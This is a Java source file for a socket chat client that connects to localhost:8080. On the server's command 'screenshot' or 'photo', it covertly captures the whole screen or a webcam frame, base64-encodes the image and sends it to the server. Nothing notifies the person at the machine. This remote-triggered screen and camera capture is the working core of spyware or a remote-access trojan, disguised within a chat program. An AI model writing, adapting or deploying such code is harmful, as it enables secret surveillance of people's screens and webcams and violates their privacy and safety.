import java.net.Socket;
import java.util.Base64;
import java.awt.image.BufferedImage;
import java.awt.*;
import java.io.*;
import javax.imageio.ImageIO;

import org.opencv.core.Core;
import org.opencv.core.Mat;
import org.opencv.videoio.VideoCapture;


public class Client {
    static {
        // Load the native OpenCV library
        System.loadLibrary(Core.NATIVE_LIBRARY_NAME);
    }
    public static void main(String[] args) {
        try {
            Socket socket = new Socket("localhost", 8080);
            System.out.println("Connected to server.");
            OutputStream outputStream = socket.getOutputStream();
            // Open reader and writer for the server socket
            BufferedReader reader = new BufferedReader(new InputStreamReader(socket.getInputStream()));
            PrintWriter writer = new PrintWriter(outputStream, true);

            // Start a new thread for reading from server and printing to client console
            new Thread(() -> {
                String inputLine;
                try {
                    while ((inputLine = reader.readLine()) != null) {
                            if (inputLine.equals("screenshot")) {
                                BufferedImage screenshot = takeScreenshot();
                                ByteArrayOutputStream baos = new ByteArrayOutputStream();
                                ImageIO.write(screenshot, "png", baos);
                                byte[] screenshotBytes = baos.toByteArray();
                                String screenshotBase64 = Base64.getEncoder().encodeToString(screenshotBytes);
                                String screenshotPrefix = "screenshot:";
                                String messageWithPrefix = screenshotPrefix + screenshotBase64;
                                // Send screenshot to server
                                writer.println(messageWithPrefix);
                            }
                            if (inputLine.equals("photo")) {
                                    BufferedImage screenshot = captureCamera();
                                    ByteArrayOutputStream baos = new ByteArrayOutputStream();
                                    ImageIO.write(screenshot, "png", baos);
                                    byte[] screenshotBytes = baos.toByteArray();
                                    String screenshotBase64 = Base64.getEncoder().encodeToString(screenshotBytes);
                                    String screenshotPrefix = "photo:";
                                    String messageWithPrefix = screenshotPrefix + screenshotBase64;
                                    // Send screenshot to server
                                    writer.println(messageWithPrefix);
                            }
                            else {
                                // Handle regular chat message
                                System.out.println("Server: " + inputLine);
                            }
                    }
                } catch (IOException e) {
                    e.printStackTrace();
                } catch (AWTException e) {
                    e.printStackTrace();
                }
            }).start();

            // Read from client console and send to server
            BufferedReader consoleReader = new BufferedReader(new InputStreamReader(System.in));
            String clientInput;
            while ((clientInput = consoleReader.readLine()) != null) {
                writer.println(clientInput);
            }

            // Close resources
            reader.close();
            writer.close();
            socket.close();
        } catch (IOException e) {
            e.printStackTrace();
        }
    }
   
    public static BufferedImage takeScreenshot() throws AWTException {
        Robot robot = new Robot();
        Rectangle screenRect = new Rectangle(Toolkit.getDefaultToolkit().getScreenSize());
        BufferedImage screenshot = robot.createScreenCapture(screenRect);
        return screenshot;
    }

    private static BufferedImage captureCamera() {
        VideoCapture capture = new VideoCapture(0); // Open the default camera (index 0)
        Mat frame = new Mat();
        if (capture.isOpened()) {
            capture.read(frame); // Capture a frame
            capture.release(); // Release the camera
        }
        return  matToBufferedImage(frame);
    }

    private static BufferedImage matToBufferedImage(Mat matrix) {
        int cols = matrix.cols();
        int rows = matrix.rows();
        int elemSize = (int) matrix.elemSize();
        byte[] data = new byte[cols * rows * elemSize];
        int type;
        matrix.get(0, 0, data);
        switch (matrix.channels()) {
            case 1:
                type = BufferedImage.TYPE_BYTE_GRAY;
                break;
            case 3:
                type = BufferedImage.TYPE_3BYTE_BGR;
                byte b;
                for (int i = 0; i < data.length; i = i + 3) {
                    b = data[i];
                    data[i] = data[i + 2];
                    data[i + 2] = b;
                }
                break;
            default:
                return null;
        }
        BufferedImage image = new BufferedImage(cols, rows, type);
        image.getRaster().setDataElements(0, 0, cols, rows, data);
        return image;
    }

    
}
